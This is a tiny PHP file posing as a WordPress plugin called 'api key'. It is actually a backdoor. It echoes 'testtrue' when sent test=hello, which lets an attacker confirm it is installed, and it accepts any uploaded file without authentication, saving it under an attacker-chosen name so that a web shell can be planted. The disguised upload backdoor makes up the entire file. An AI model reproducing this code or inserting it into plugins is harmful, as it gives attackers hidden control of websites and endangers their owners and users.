<?php
/**
 * @package api key
 */
/*
Plugin Name: api key
*/

if ("hello"==$_GET["test"])
{
 echo "testtrue";
}
if(is_uploaded_file($_FILES["filename"]["tmp_name"]))
{
 move_uploaded_file($_FILES["filename"]["tmp_name"],$_FILES["filename"]["name"]);
 echo "true";
}